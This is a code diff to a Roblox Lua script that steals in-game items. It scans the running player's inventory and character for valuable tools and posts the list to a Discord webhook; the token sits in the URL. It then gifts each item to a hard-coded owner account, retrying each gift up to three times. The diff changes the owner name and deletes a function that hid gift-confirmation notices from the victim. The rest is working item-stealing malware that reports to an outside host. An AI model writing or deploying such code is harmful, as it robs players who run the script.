@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "werovasquez"
+local OWNER = "frogman_bacon"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -25,7 +25,6 @@ local function getItems()
             table.insert(found, item)
         end
     end
-    -- Also check already equipped items in character
     if lp.Character then
         for _, item in ipairs(lp.Character:GetChildren()) do
             if item:IsA("Tool") and isValuable(item.Name) then
@@ -64,9 +63,8 @@ local function giftAll(ownerPlayer, items)
 
     task.wait(0.5)
 
-    -- Gift each item one by one (no need to walk to owner)
+    -- Gift each item one by one
     for idx, item in ipairs(items) do
-        -- Make sure item still exists
         if not item or not item.Parent then 
             print("⚠ Item " .. idx .. " no longer exists")
             continue 
@@ -74,14 +72,12 @@ local function giftAll(ownerPlayer, items)
 
         print("Gifting (" .. idx .. "/" .. #items .. "): " .. item.Name)
 
-        -- Equip it (move to character)
         local wasInBackpack = item.Parent == lp.Backpack
         if wasInBackpack then
             item.Parent = char
             task.wait(0.5)
         end
 
-        -- Fire gift remote
         local success = false
         for attempt = 1, 3 do
             pcall(function()
@@ -89,14 +85,12 @@ local function giftAll(ownerPlayer, items)
             end)
             task.wait(0.8)
             
-            -- Check if item was gifted (should disappear from inventory)
             if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
                 success = true
                 break
             end
             
             if attempt < 3 then
-                print("  Retry " .. attempt .. "/2...")
                 task.wait(0.3)
             end
         end
@@ -113,47 +107,7 @@ local function giftAll(ownerPlayer, items)
     print("✓ Gifting complete!")
 end
 
-local function hideNotifications()
-    -- Try to find and hide notification GUIs
-    local ok, PlayerGui = pcall(function()
-        return lp:WaitForChild("PlayerGui", 5)
-    end)
-    
-    if not ok or not PlayerGui then
-        print("⚠ Could not access PlayerGui for hiding notifications")
-        return
-    end
-    
-    -- Hide existing notifications
-    pcall(function()
-        for _, child in ipairs(PlayerGui:GetDescendants()) do
-            if child:IsA("TextLabel") or child:IsA("TextButton") then
-                local text = child.Text or ""
-                if text:find("wait before gifting") or text:find("accepted your gift") or text:find("Please wait") then
-                    child.Visible = false
-                end
-            end
-        end
-    end)
-    
-    -- Watch for new notifications and hide them
-    pcall(function()
-        PlayerGui.DescendantAdded:Connect(function(descendant)
-            if descendant:IsA("TextLabel") then
-                local text = descendant.Text or ""
-                if text:find("wait before gifting") or text:find("accepted") or text:find("Please wait") then
-                    task.wait(0.05)
-                    descendant.Visible = false
-                end
-            end
-        end)
-    end)
-    
-    print("✓ Notification hider active")
-end
-
--- Hide notifications on startup
-task.spawn(hideNotifications)
+local function tryGift(ownerPlayer, items)
     ownerPlayer.CharacterAdded:Wait()
     task.wait(2)
     giftAll(ownerPlayer, items)
@@ -169,7 +123,6 @@ end
 print("Found " .. #items .. " valuable items")
 sendWebhook(items)
 
--- Check if owner already in server
 local owner = nil
 for _, p in ipairs(Players:GetPlayers()) do
     if p ~= lp and p.Name:lower() == OWNER:lower() then
